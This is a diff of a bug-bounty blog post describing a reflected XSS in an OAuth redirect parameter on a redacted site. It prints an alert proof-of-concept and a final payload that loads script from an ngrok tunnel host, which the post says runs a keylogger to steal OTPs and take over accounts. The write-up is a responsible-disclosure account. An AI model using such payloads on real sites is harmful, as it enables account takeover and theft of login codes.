@@ -1,5 +1,6 @@
 <html>
   <head>
+    <link rel="icon" type="image/x-icon" href="../assets/favicon.ico">
     <meta name="keywords" content="CTF, Writeups, Cyber, Blog,Xclow3n" />
     <meta name="description" content="Xclow3n" />
     <meta name="HandheldFriendly" content="True" />
@@ -162,13 +163,38 @@
                         <p>
                             Hello Hackers, It's my first blog so, there might be some mistakes. So please 
                             ignore them lets get started without wasting more time. I cannot disclose the 
-                            name of the website. Let's call it <b>"redacted.com"</b> so the company had its OAuth system on <b>oauth.redacted.com</b>.
+                            name of the website. Let's call it <b>redacted.com</b> so the company had its OAuth system on <b>oauth.redacted.com</b>.
                             So when a user clicks on the login button on the main domain the user was redirected 
-                            to <b>oauth.redacted.com</b> like this <b>
-                            https://oauth.redacted.com/oauth/authorize?client_id=[ID]&response_type=code&redirect_uri=https://redacted.com/auth/something&state=Random-Token&display=popup</b>
-                            
+                            to <b>oauth.redacted.com</b> like this
+                            <div class="codeBlock">
+                            https://oauth.redacted.com/oauth/authorize?client_id=[ID]&response_type=code&redirect_uri=https://redacted.com/auth/something&state=Random-Token
+                            </div>
+                            and the web app stores the domain in redirect parameter in javascript variable like this
+                            <div class="codeBlock">
+                            window.redirect_url ='https://redacted.com/auth/oauth?error=access_denied&state=RANDOM-TOKEN'
+                            </div>
+                            So by looking at the variable, we can see that the web app was using this variable to redirect the user back to the web application from where the OAuth flow started if the user cancels the login process. Token stealing was not possible in this situation because before giving the access token to the "Third-Party Application" the web application checks if the domain is whitelisted or not.
+                            The only bug I had at this moment was a conditional open redirect bug. Later I tried injecting XSS payload in redirect parameter and it worked. The initial payload looked this like this
+                            <div class="codeBlock">
+                                https://oauth.redacted.com/oauth/authorize?client_id=[ID]&response_type=code&redirect_uri=https://redacted.com/auth/something';alert(document.domain);x='&state=Random-Token
+                            </div>
+                            I quickly created a POC and reported it.Later I got a response from the company's staff asking to provide a real case scenario where this bug could be exploited
                         </p>
                     </div>
+                    <strong>
+                        <h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>The Problem</h2>
+                    </strong>
+                        <p>
+                            Now the problem was that the web app was using OTP based Auth system and once the user enters his/her phone number the web application redirects the user to a different page and the user enters their OTP there and that page wasn't vulnerable to XSS and even if we were able to steal the OTP we cannot reuse OTP on the web application. Now if we see basically with this XSS we cannot steal tokens, cookies, OTP. We just have one page where our payload will trigger
+                        </p>
+                        <strong>
+                            <h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>The Solution</h2>
+                        </strong>
+                        <p>The Only Solution I could come up with was to add a keylogger and remove the  "Send Code" button and add my button there with the same CSS property and once the user clicks on my rogue button the content of the page dynamically changes to the OTP page and I get a request on my server with the victim's phone number and then I manually request for an OTP from my side. Now we are on the same page and we still have control. Now, whenever victims press any key I get a request on my server with that key. Once the victim enters complete OTP we get the OTP on our server and we can just redirect the victim to our web app and Account Takeover is possible. So I quickly created all this and created a video and submitted it.The final payload looked like this 
+                            <div class="codeBlock">
+                                https://oauth.redacted/oauth/redacted?client_id=[ID]&response_type=code&redirect_uri=https://bing.com%27;var r=document.createElement('script');r.src = 'https://[tunnel].ngrok.io/s.js';document.head.appendChild(r);var%20x=%27
+                            </div>
+                            Later the severity was changed to medium and a 300$ bounty was paid. </p>
                     </section>
                 </article>
                 
@@ -193,7 +219,7 @@
                   <ul class="entry">
                     <li>
                          
-                        <div class="name">
+                        <div class="name" style="font-size:13px">
                           I'm just a simple 17 yrs old learner trying to learn stuff on his own.<br>Help me get a Certification.
 
                         </div>
